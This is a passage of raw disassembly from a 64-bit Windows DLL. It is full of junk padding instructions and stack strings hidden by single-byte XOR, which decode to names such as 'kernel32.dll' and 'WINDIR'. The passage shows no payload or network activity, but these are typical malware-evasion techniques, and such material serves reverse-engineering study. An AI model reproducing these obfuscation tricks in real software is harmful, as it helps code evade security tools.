   180002b76:	ff 15 74 17 02 00    	call   *0x21774(%rip)        # 0x1800242f0
   180002b7c:	90                   	nop
   180002b7d:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   180002b84:	5f                   	pop    %rdi
   180002b85:	5e                   	pop    %rsi
   180002b86:	c3                   	ret
   180002b87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180002b8e:	00 00 
   180002b90:	56                   	push   %rsi
   180002b91:	57                   	push   %rdi
   180002b92:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   180002b99:	b9 f9 02 00 00       	mov    $0x2f9,%ecx
   180002b9e:	e8 2d e9 ff ff       	call   0x1800014d0
   180002ba3:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180002ba8:	ff 15 e2 16 02 00    	call   *0x216e2(%rip)        # 0x180024290
   180002bae:	48 89 c1             	mov    %rax,%rcx
   180002bb1:	ff 15 61 16 02 00    	call   *0x21661(%rip)        # 0x180024218
   180002bb7:	4d 87 ed             	xchg   %r13,%r13
   180002bba:	4d 87 ff             	xchg   %r15,%r15
   180002bbd:	48 87 c9             	xchg   %rcx,%rcx
   180002bc0:	ff 15 3a 16 02 00    	call   *0x2163a(%rip)        # 0x180024200
   180002bc6:	48 85 c0             	test   %rax,%rax
   180002bc9:	74 09                	je     0x180002bd4
   180002bcb:	48 89 c1             	mov    %rax,%rcx
   180002bce:	ff 15 bc 15 02 00    	call   *0x215bc(%rip)        # 0x180024190
   180002bd4:	51                   	push   %rcx
   180002bd5:	59                   	pop    %rcx
   180002bd6:	90                   	nop
   180002bd7:	90                   	nop
   180002bd8:	90                   	nop
   180002bd9:	90                   	nop
   180002bda:	ba 00 10 00 00       	mov    $0x1000,%edx
   180002bdf:	31 c9                	xor    %ecx,%ecx
   180002be1:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180002be7:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180002bed:	ff 15 15 18 02 00    	call   *0x21815(%rip)        # 0x180024408
   180002bf3:	48 85 c0             	test   %rax,%rax
   180002bf6:	74 11                	je     0x180002c09
   180002bf8:	48 89 c1             	mov    %rax,%rcx
   180002bfb:	31 d2                	xor    %edx,%edx
   180002bfd:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
   180002c03:	ff 15 07 18 02 00    	call   *0x21807(%rip)        # 0x180024410
   180002c09:	48 87 d2             	xchg   %rdx,%rdx
   180002c0c:	4d 8d 36             	lea    (%r14),%r14
   180002c0f:	4d 89 ff             	mov    %r15,%r15
   180002c12:	c7 44 24 50 ac 01 b2 	movl   $0xb201ac,0x50(%rsp)
   180002c19:	00 
   180002c1a:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002c1e:	53                   	push   %rbx
   180002c1f:	4d 89 f6             	mov    %r14,%r14
   180002c22:	5b                   	pop    %rbx
   180002c23:	b9 a9 02 00 00       	mov    $0x2a9,%ecx
   180002c28:	e8 e3 f6 ff ff       	call   0x180002310
   180002c2d:	48 8b 3d 94 16 02 00 	mov    0x21694(%rip),%rdi        # 0x1800242c8
   180002c34:	ff d7                	call   *%rdi
   180002c36:	57                   	push   %rdi
   180002c37:	5f                   	pop    %rdi
   180002c38:	ff 15 aa 15 02 00    	call   *0x215aa(%rip)        # 0x1800241e8
   180002c3e:	90                   	nop
   180002c3f:	4d 89 f6             	mov    %r14,%r14
   180002c42:	90                   	nop
   180002c43:	41 50                	push   %r8
   180002c45:	41 58                	pop    %r8
   180002c47:	48 8b 35 42 16 02 00 	mov    0x21642(%rip),%rsi        # 0x180024290
   180002c4e:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   180002c53:	ff d6                	call   *%rsi
   180002c55:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   180002c5a:	ff d6                	call   *%rsi
   180002c5c:	c7 44 24 50 2a 18 c9 	movl   $0xc9182a,0x50(%rsp)
   180002c63:	00 
   180002c64:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002c68:	41 56                	push   %r14
   180002c6a:	48 87 d2             	xchg   %rdx,%rdx
   180002c6d:	41 5e                	pop    %r14
   180002c6f:	41 54                	push   %r12
   180002c71:	4d 87 c9             	xchg   %r9,%r9
   180002c74:	41 5c                	pop    %r12
   180002c76:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180002c7a:	4d 87 e4             	xchg   %r12,%r12
   180002c7d:	48 8d 00             	lea    (%rax),%rax
   180002c80:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180002c84:	48 87 db             	xchg   %rbx,%rbx
   180002c87:	e8 b4 e9 ff ff       	call   0x180001640
   180002c8c:	b9 19 01 00 00       	mov    $0x119,%ecx
   180002c91:	e8 ba f3 ff ff       	call   0x180002050
   180002c96:	50                   	push   %rax
   180002c97:	4d 89 f6             	mov    %r14,%r14
   180002c9a:	58                   	pop    %rax
   180002c9b:	ff 15 87 15 02 00    	call   *0x21587(%rip)        # 0x180024228
   180002ca1:	52                   	push   %rdx
   180002ca2:	41 51                	push   %r9
   180002ca4:	41 59                	pop    %r9
   180002ca6:	5a                   	pop    %rdx
   180002ca7:	e8 a4 f0 ff ff       	call   0x180001d50
   180002cac:	31 c9                	xor    %ecx,%ecx
   180002cae:	ff 15 ac 15 02 00    	call   *0x215ac(%rip)        # 0x180024260
   180002cb4:	41 50                	push   %r8
   180002cb6:	90                   	nop
   180002cb7:	41 58                	pop    %r8
   180002cb9:	e8 82 e9 ff ff       	call   0x180001640
   180002cbe:	48 89 e4             	mov    %rsp,%rsp
   180002cc1:	90                   	nop
   180002cc2:	48 89 c9             	mov    %rcx,%rcx
   180002cc5:	48 8d 12             	lea    (%rdx),%rdx
   180002cc8:	ff 15 22 15 02 00    	call   *0x21522(%rip)        # 0x1800241f0
   180002cce:	89 c6                	mov    %eax,%esi
   180002cd0:	ff d7                	call   *%rdi
   180002cd2:	31 f0                	xor    %esi,%eax
   180002cd4:	89 44 24 50          	mov    %eax,0x50(%rsp)
   180002cd8:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002cdc:	52                   	push   %rdx
   180002cdd:	48 87 d2             	xchg   %rdx,%rdx
   180002ce0:	4d 8d 1b             	lea    (%r11),%r11
   180002ce3:	5a                   	pop    %rdx
   180002ce4:	50                   	push   %rax
   180002ce5:	58                   	pop    %rax
   180002ce6:	e8 a5 f1 ff ff       	call   0x180001e90
   180002ceb:	41 53                	push   %r11
   180002ced:	41 5b                	pop    %r11
   180002cef:	c7 44 24 2c 73 00 00 	movl   $0x73,0x2c(%rsp)
   180002cf6:	00 
   180002cf7:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002cfb:	83 f0 30             	xor    $0x30,%eax
   180002cfe:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002d03:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d07:	83 f0 49             	xor    $0x49,%eax
   180002d0a:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180002d0f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d13:	83 f0 2f             	xor    $0x2f,%eax
   180002d16:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180002d1b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d1f:	83 f0 24             	xor    $0x24,%eax
   180002d22:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180002d27:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d2b:	83 f0 1a             	xor    $0x1a,%eax
   180002d2e:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180002d33:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d37:	83 f0 1d             	xor    $0x1d,%eax
   180002d3a:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180002d3f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d43:	83 f0 17             	xor    $0x17,%eax
   180002d46:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   180002d4b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d4f:	83 f0 1c             	xor    $0x1c,%eax
   180002d52:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180002d57:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d5b:	83 f0 04             	xor    $0x4,%eax
   180002d5e:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180002d63:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002d67:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180002d6c:	66 c7 44 24 44 00 00 	movw   $0x0,0x44(%rsp)
   180002d73:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002d78:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002d7d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002d83:	ff 15 b7 14 02 00    	call   *0x214b7(%rip)        # 0x180024240
   180002d89:	41 53                	push   %r11
   180002d8b:	52                   	push   %rdx
   180002d8c:	5a                   	pop    %rdx
   180002d8d:	41 5b                	pop    %r11
   180002d8f:	4d 87 ed             	xchg   %r13,%r13
   180002d92:	48 89 ed             	mov    %rbp,%rbp
   180002d95:	e8 e6 e5 ff ff       	call   0x180001380
   180002d9a:	c7 44 24 50 d5 2a 73 	movl   $0x732ad5,0x50(%rsp)
   180002da1:	00 
   180002da2:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180002da6:	e8 55 eb ff ff       	call   0x180001900
   180002dab:	41 54                	push   %r12
   180002dad:	41 5c                	pop    %r12
   180002daf:	41 55                	push   %r13
   180002db1:	4d 87 d2             	xchg   %r10,%r10
   180002db4:	41 5d                	pop    %r13
   180002db6:	90                   	nop
   180002db7:	48 87 db             	xchg   %rbx,%rbx
   180002dba:	90                   	nop
   180002dbb:	90                   	nop
   180002dbc:	41 53                	push   %r11
   180002dbe:	41 52                	push   %r10
   180002dc0:	41 5a                	pop    %r10
   180002dc2:	41 5b                	pop    %r11
   180002dc4:	41 55                	push   %r13
   180002dc6:	41 50                	push   %r8
   180002dc8:	41 58                	pop    %r8
   180002dca:	41 5d                	pop    %r13
   180002dcc:	ff d7                	call   *%rdi
   180002dce:	90                   	nop
   180002dcf:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   180002dd6:	5f                   	pop    %rdi
   180002dd7:	5e                   	pop    %rsi
   180002dd8:	c3                   	ret
   180002dd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002de0:	48 83 ec 38          	sub    $0x38,%rsp
   180002de4:	c7 44 24 34 5d 00 00 	movl   $0x5d,0x34(%rsp)
   180002deb:	00 
   180002dec:	8b 44 24 34          	mov    0x34(%rsp),%eax
   180002df0:	48 87 ff             	xchg   %rdi,%rdi
   180002df3:	4d 89 d2             	mov    %r10,%r10
   180002df6:	4d 8d 36             	lea    (%r14),%r14
   180002df9:	b9 2c 03 00 00       	mov    $0x32c,%ecx
   180002dfe:	e8 2d e5 ff ff       	call   0x180001330
   180002e03:	51                   	push   %rcx
   180002e04:	41 53                	push   %r11
   180002e06:	41 5b                	pop    %r11
   180002e08:	59                   	pop    %rcx
   180002e09:	c7 44 24 28 b2 00 00 	movl   $0xb2,0x28(%rsp)
   180002e10:	00 
   180002e11:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002e15:	35 f1 00 00 00       	xor    $0xf1,%eax
   180002e1a:	66 89 44 24 2c       	mov    %ax,0x2c(%rsp)
   180002e1f:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002e23:	35 88 00 00 00       	xor    $0x88,%eax
   180002e28:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   180002e2d:	8b 44 24 28          	mov    0x28(%rsp),%eax
   180002e31:	35 ee 00 00 00       	xor    $0xee,%eax
   180002e36:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180002e3b:	66 c7 44 24 32 00 00 	movw   $0x0,0x32(%rsp)
   180002e42:	48 8d 4c 24 2c       	lea    0x2c(%rsp),%rcx
   180002e47:	ff 15 ab 13 02 00    	call   *0x213ab(%rip)        # 0x1800241f8
   180002e4d:	41 54                	push   %r12
   180002e4f:	55                   	push   %rbp
   180002e50:	5d                   	pop    %rbp
   180002e51:	41 5c                	pop    %r12
   180002e53:	b9 00 04 00 00       	mov    $0x400,%ecx
   180002e58:	ba 01 00 00 00       	mov    $0x1,%edx
   180002e5d:	ff 15 e5 14 02 00    	call   *0x214e5(%rip)        # 0x180024348
   180002e63:	c7 44 24 2c e7 47 86 	movl   $0x8647e7,0x2c(%rsp)
   180002e6a:	00 
   180002e6b:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180002e6f:	90                   	nop
   180002e70:	48 89 db             	mov    %rbx,%rbx
   180002e73:	90                   	nop
   180002e74:	48 89 c9             	mov    %rcx,%rcx
   180002e77:	4d 87 ed             	xchg   %r13,%r13
   180002e7a:	48 89 f6             	mov    %rsi,%rsi
   180002e7d:	4d 8d 00             	lea    (%r8),%r8
   180002e80:	4d 89 ed             	mov    %r13,%r13
   180002e83:	48 87 ff             	xchg   %rdi,%rdi
   180002e86:	4d 89 c9             	mov    %r9,%r9
   180002e89:	31 c0                	xor    %eax,%eax
   180002e8b:	48 83 c4 38          	add    $0x38,%rsp
   180002e8f:	c3                   	ret
   180002e90:	48 81 ec 28 02 00 00 	sub    $0x228,%rsp
   180002e97:	b9 af 01 00 00       	mov    $0x1af,%ecx
   180002e9c:	e8 3f e9 ff ff       	call   0x1800017e0
   180002ea1:	41 53                	push   %r11
   180002ea3:	41 52                	push   %r10
   180002ea5:	41 5a                	pop    %r10
   180002ea7:	41 5b                	pop    %r11
   180002ea9:	e8 12 ee ff ff       	call   0x180001cc0
   180002eae:	b9 03 00 00 00       	mov    $0x3,%ecx
   180002eb3:	ff 15 7f 14 02 00    	call   *0x2147f(%rip)        # 0x180024338
   180002eb9:	90                   	nop
   180002eba:	48 89 e4             	mov    %rsp,%rsp
   180002ebd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002ec2:	ff 15 08 14 02 00    	call   *0x21408(%rip)        # 0x1800242d0
   180002ec8:	ff 15 0a 13 02 00    	call   *0x2130a(%rip)        # 0x1800241d8
   180002ece:	c7 44 24 20 e7 a4 92 	movl   $0x92a4e7,0x20(%rsp)
   180002ed5:	00 
   180002ed6:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002eda:	48 8d 36             	lea    (%rsi),%rsi
   180002edd:	90                   	nop
   180002ede:	4d 89 e4             	mov    %r12,%r12
   180002ee1:	4d 8d 00             	lea    (%r8),%r8
   180002ee4:	48 8d 3f             	lea    (%rdi),%rdi
   180002ee7:	4d 8d 36             	lea    (%r14),%r14
   180002eea:	52                   	push   %rdx
   180002eeb:	41 51                	push   %r9
   180002eed:	41 59                	pop    %r9
   180002eef:	5a                   	pop    %rdx
   180002ef0:	b9 23 02 00 00       	mov    $0x223,%ecx
   180002ef5:	e8 36 f5 ff ff       	call   0x180002430
   180002efa:	4d 8d 24 24          	lea    (%r12),%r12
   180002efe:	48 8d 12             	lea    (%rdx),%rdx
   180002f01:	4d 87 d2             	xchg   %r10,%r10
   180002f04:	90                   	nop
   180002f05:	90                   	nop
   180002f06:	ff 15 a4 12 02 00    	call   *0x212a4(%rip)        # 0x1800241b0
   180002f0c:	48 87 e4             	xchg   %rsp,%rsp
   180002f0f:	31 c9                	xor    %ecx,%ecx
   180002f11:	ff 15 b1 14 02 00    	call   *0x214b1(%rip)        # 0x1800243c8
   180002f17:	4d 87 db             	xchg   %r11,%r11
   180002f1a:	4d 8d 24 24          	lea    (%r12),%r12
   180002f1e:	48 87 d2             	xchg   %rdx,%rdx
   180002f21:	4d 87 ed             	xchg   %r13,%r13
   180002f24:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002f29:	ff 15 81 13 02 00    	call   *0x21381(%rip)        # 0x1800242b0
   180002f2f:	56                   	push   %rsi
   180002f30:	5e                   	pop    %rsi
   180002f31:	ff 15 a9 12 02 00    	call   *0x212a9(%rip)        # 0x1800241e0
   180002f37:	c7 44 24 20 13 6d 0a 	movl   $0xa6d13,0x20(%rsp)
   180002f3e:	00 
   180002f3f:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002f43:	4d 8d 3f             	lea    (%r15),%r15
   180002f46:	4d 89 ff             	mov    %r15,%r15
   180002f49:	4d 87 c9             	xchg   %r9,%r9
   180002f4c:	41 53                	push   %r11
   180002f4e:	48 89 f6             	mov    %rsi,%rsi
   180002f51:	48 89 ed             	mov    %rbp,%rbp
   180002f54:	41 5b                	pop    %r11
   180002f56:	b9 3f 02 00 00       	mov    $0x23f,%ecx
   180002f5b:	e8 e0 ea ff ff       	call   0x180001a40
   180002f60:	4d 89 e4             	mov    %r12,%r12
   180002f63:	48 89 ff             	mov    %rdi,%rdi
   180002f66:	4d 87 ed             	xchg   %r13,%r13
   180002f69:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002f6e:	b9 04 01 00 00       	mov    $0x104,%ecx
   180002f73:	ff 15 57 12 02 00    	call   *0x21257(%rip)        # 0x1800241d0
   180002f79:	90                   	nop
   180002f7a:	48 87 f6             	xchg   %rsi,%rsi
   180002f7d:	90                   	nop
   180002f7e:	4d 87 d2             	xchg   %r10,%r10
   180002f81:	4d 8d 36             	lea    (%r14),%r14
   180002f84:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002f89:	ba 04 01 00 00       	mov    $0x104,%edx
   180002f8e:	ff 15 0c 13 02 00    	call   *0x2130c(%rip)        # 0x1800242a0
   180002f94:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180002f98:	4d 87 e4             	xchg   %r12,%r12
   180002f9b:	4d 8d 09             	lea    (%r9),%r9
   180002f9e:	41 56                	push   %r14
   180002fa0:	51                   	push   %rcx
   180002fa1:	59                   	pop    %rcx
   180002fa2:	41 5e                	pop    %r14
   180002fa4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002fa9:	ba 04 01 00 00       	mov    $0x104,%edx
   180002fae:	ff 15 34 13 02 00    	call   *0x21334(%rip)        # 0x1800242e8
   180002fb4:	c7 44 24 20 0d 94 67 	movl   $0x67940d,0x20(%rsp)
   180002fbb:	00 
   180002fbc:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180002fc0:	57                   	push   %rdi
   180002fc1:	53                   	push   %rbx
   180002fc2:	5b                   	pop    %rbx
   180002fc3:	5f                   	pop    %rdi
   180002fc4:	48 87 ff             	xchg   %rdi,%rdi
   180002fc7:	90                   	nop
   180002fc8:	90                   	nop
   180002fc9:	4d 8d 36             	lea    (%r14),%r14
   180002fcc:	4d 8d 1b             	lea    (%r11),%r11
   180002fcf:	48 8d 36             	lea    (%rsi),%rsi
   180002fd2:	4d 89 c0             	mov    %r8,%r8
   180002fd5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002fda:	b9 04 01 00 00       	mov    $0x104,%ecx
   180002fdf:	ff 15 d3 12 02 00    	call   *0x212d3(%rip)        # 0x1800242b8
   180002fe5:	90                   	nop
   180002fe6:	48 81 c4 28 02 00 00 	add    $0x228,%rsp
   180002fed:	c3                   	ret
   180002fee:	66 90                	xchg   %ax,%ax
   180002ff0:	56                   	push   %rsi
   180002ff1:	57                   	push   %rdi
   180002ff2:	48 81 ec 68 02 00 00 	sub    $0x268,%rsp
   180002ff9:	b9 10 02 00 00       	mov    $0x210,%ecx
   180002ffe:	e8 0d e6 ff ff       	call   0x180001610
   180003003:	56                   	push   %rsi
   180003004:	4d 89 db             	mov    %r11,%r11
   180003007:	4d 87 db             	xchg   %r11,%r11
   18000300a:	5e                   	pop    %rsi
   18000300b:	51                   	push   %rcx
   18000300c:	48 89 ed             	mov    %rbp,%rbp
   18000300f:	59                   	pop    %rcx
   180003010:	ff 15 da 11 02 00    	call   *0x211da(%rip)        # 0x1800241f0
   180003016:	4d 8d 24 24          	lea    (%r12),%r12
   18000301a:	48 8d 36             	lea    (%rsi),%rsi
   18000301d:	48 87 d2             	xchg   %rdx,%rdx
   180003020:	48 8d 1b             	lea    (%rbx),%rbx
   180003023:	c7 44 24 50 b8 00 00 	movl   $0xb8,0x50(%rsp)
   18000302a:	00 
   18000302b:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000302f:	35 d3 00 00 00       	xor    $0xd3,%eax
   180003034:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   180003039:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000303d:	35 dd 00 00 00       	xor    $0xdd,%eax
   180003042:	66 89 44 24 62       	mov    %ax,0x62(%rsp)
   180003047:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000304b:	35 ca 00 00 00       	xor    $0xca,%eax
   180003050:	66 89 44 24 64       	mov    %ax,0x64(%rsp)
   180003055:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003059:	35 d6 00 00 00       	xor    $0xd6,%eax
   18000305e:	66 89 44 24 66       	mov    %ax,0x66(%rsp)
   180003063:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003067:	35 dd 00 00 00       	xor    $0xdd,%eax
   18000306c:	66 89 44 24 68       	mov    %ax,0x68(%rsp)
   180003071:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003075:	35 d4 00 00 00       	xor    $0xd4,%eax
   18000307a:	66 89 44 24 6a       	mov    %ax,0x6a(%rsp)
   18000307f:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003083:	35 8b 00 00 00       	xor    $0x8b,%eax
   180003088:	66 89 44 24 6c       	mov    %ax,0x6c(%rsp)
   18000308d:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180003091:	35 8a 00 00 00       	xor    $0x8a,%eax
   180003096:	66 89 44 24 6e       	mov    %ax,0x6e(%rsp)
   18000309b:	8b 44 24 50          	mov    0x50(%rsp),%eax
   18000309f:	35 96 00 00 00       	xor    $0x96,%eax
   1800030a4:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   1800030a9:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800030ad:	35 dc 00 00 00       	xor    $0xdc,%eax
   1800030b2:	66 89 44 24 72       	mov    %ax,0x72(%rsp)
   1800030b7:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800030bb:	35 d4 00 00 00       	xor    $0xd4,%eax
   1800030c0:	66 89 44 24 74       	mov    %ax,0x74(%rsp)
   1800030c5:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800030c9:	35 d4 00 00 00       	xor    $0xd4,%eax
   1800030ce:	66 89 44 24 76       	mov    %ax,0x76(%rsp)
   1800030d3:	66 c7 44 24 78 00 00 	movw   $0x0,0x78(%rsp)
   1800030da:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800030df:	ff 15 7b 11 02 00    	call   *0x2117b(%rip)        # 0x180024260
   1800030e5:	41 53                	push   %r11
   1800030e7:	4d 87 ff             	xchg   %r15,%r15
   1800030ea:	41 5b                	pop    %r11
   1800030ec:	41 51                	push   %r9
   1800030ee:	41 59                	pop    %r9
   1800030f0:	31 c9                	xor    %ecx,%ecx
   1800030f2:	ff 15 70 10 02 00    	call   *0x21070(%rip)        # 0x180024168
   1800030f8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1800030fb:	74 08                	je     0x180003105
   1800030fd:	89 c1                	mov    %eax,%ecx
   1800030ff:	ff 15 6b 10 02 00    	call   *0x2106b(%rip)        # 0x180024170
   180003105:	c7 44 24 60 d4 11 9e 	movl   $0x9e11d4,0x60(%rsp)
   18000310c:	00 
   18000310d:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180003111:	48 87 db             	xchg   %rbx,%rbx
   180003114:	4d 8d 12             	lea    (%r10),%r10
   180003117:	4d 87 db             	xchg   %r11,%r11
   18000311a:	48 87 e4             	xchg   %rsp,%rsp
   18000311d:	57                   	push   %rdi
   18000311e:	4d 89 d2             	mov    %r10,%r10
   180003121:	5f                   	pop    %rdi
   180003122:	b9 9a 02 00 00       	mov    $0x29a,%ecx
   180003127:	e8 44 ed ff ff       	call   0x180001e70
   18000312c:	4d 8d 00             	lea    (%r8),%r8
   18000312f:	90                   	nop
   180003130:	48 8d 0d 71 d9 01 00 	lea    0x1d971(%rip),%rcx        # 0x180020aa8
   180003137:	ff 15 13 11 02 00    	call   *0x21113(%rip)        # 0x180024250
   18000313d:	48 8d 36             	lea    (%rsi),%rsi
   180003140:	48 87 c9             	xchg   %rcx,%rcx
   180003143:	4d 8d 12             	lea    (%r10),%r10
   180003146:	e8 85 ed ff ff       	call   0x180001ed0
   18000314b:	c7 44 24 60 40 00 00 	movl   $0x40,0x60(%rsp)
   180003152:	00 
   180003153:	48 8b 3d 96 11 02 00 	mov    0x21196(%rip),%rdi        # 0x1800242f0
   18000315a:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   18000315f:	48 89 f1             	mov    %rsi,%rcx
   180003162:	ff d7                	call   *%rdi
   180003164:	57                   	push   %rdi
   180003165:	4d 89 db             	mov    %r11,%r11
   180003168:	4d 8d 3f             	lea    (%r15),%r15
   18000316b:	5f                   	pop    %rdi
   18000316c:	41 50                	push   %r8
   18000316e:	4d 89 c0             	mov    %r8,%r8
   180003171:	41 58                	pop    %r8
   180003173:	ff 15 3f 10 02 00    	call   *0x2103f(%rip)        # 0x1800241b8
   180003179:	41 55                	push   %r13
   18000317b:	4d 87 ed             	xchg   %r13,%r13
   18000317e:	48 89 db             	mov    %rbx,%rbx
   180003181:	41 5d                	pop    %r13
   180003183:	e8 c8 eb ff ff       	call   0x180001d50
   180003188:	c7 44 24 60 26 89 79 	movl   $0x798926,0x60(%rsp)
   18000318f:	00 
   180003190:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180003194:	4d 8d 36             	lea    (%r14),%r14
   180003197:	48 89 e4             	mov    %rsp,%rsp
   18000319a:	4d 89 c9             	mov    %r9,%r9
   18000319d:	48 8d 1b             	lea    (%rbx),%rbx
   1800031a0:	48 8d 00             	lea    (%rax),%rax
   1800031a3:	48 87 ff             	xchg   %rdi,%rdi
   1800031a6:	48 89 ed             	mov    %rbp,%rbp
   1800031a9:	b9 42 02 00 00       	mov    $0x242,%ecx
   1800031ae:	e8 7d f2 ff ff       	call   0x180002430
   1800031b3:	ff 15 1f 11 02 00    	call   *0x2111f(%rip)        # 0x1800242d8
   1800031b9:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800031bc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1800031c1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800031c6:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800031cd:	00 
   1800031ce:	4c 8d 05 e1 d8 01 00 	lea    0x1d8e1(%rip),%r8        # 0x180020ab6
   1800031d5:	31 c9                	xor    %ecx,%ecx
   1800031d7:	31 d2                	xor    %edx,%edx
   1800031d9:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800031df:	ff 15 43 12 02 00    	call   *0x21243(%rip)        # 0x180024428
   1800031e5:	90                   	nop
   1800031e6:	4d 87 d2             	xchg   %r10,%r10
   1800031e9:	c7 44 24 4c 34 00 00 	movl   $0x34,0x4c(%rsp)
   1800031f0:	00 
   1800031f1:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800031f5:	83 f0 63             	xor    $0x63,%eax
   1800031f8:	66 89 44 24 50       	mov    %ax,0x50(%rsp)
   1800031fd:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003201:	83 f0 7d             	xor    $0x7d,%eax
   180003204:	66 89 44 24 52       	mov    %ax,0x52(%rsp)
   180003209:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   18000320d:	83 f0 7a             	xor    $0x7a,%eax
   180003210:	66 89 44 24 54       	mov    %ax,0x54(%rsp)
   180003215:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003219:	83 f0 70             	xor    $0x70,%eax
   18000321c:	66 89 44 24 56       	mov    %ax,0x56(%rsp)
   180003221:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003225:	83 f0 7d             	xor    $0x7d,%eax
   180003228:	66 89 44 24 58       	mov    %ax,0x58(%rsp)
   18000322d:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180003231:	83 f0 66             	xor    $0x66,%eax
   180003234:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
   180003239:	66 c7 44 24 5c 00 00 	movw   $0x0,0x5c(%rsp)
   180003240:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180003245:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000324a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003250:	ff 15 b2 0f 02 00    	call   *0x20fb2(%rip)        # 0x180024208
   180003256:	41 50                	push   %r8
   180003258:	41 58                	pop    %r8
   18000325a:	c7 44 24 60 d5 ee a0 	movl   $0xa0eed5,0x60(%rsp)
   180003261:	00 
   180003262:	8b 44 24 60          	mov    0x60(%rsp),%eax
   180003266:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   18000326a:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000326e:	4d 89 db             	mov    %r11,%r11
   180003271:	4d 87 e4             	xchg   %r12,%r12
   180003274:	53                   	push   %rbx
   180003275:	4d 87 d2             	xchg   %r10,%r10
   180003278:	4d 87 db             	xchg   %r11,%r11
   18000327b:	5b                   	pop    %rbx
   18000327c:	e8 bf e3 ff ff       	call   0x180001640
   180003281:	41 56                	push   %r14
   180003283:	41 5e                	pop    %r14
   180003285:	4d 89 c9             	mov    %r9,%r9
   180003288:	48 87 e4             	xchg   %rsp,%rsp
   18000328b:	48 87 ed             	xchg   %rbp,%rbp
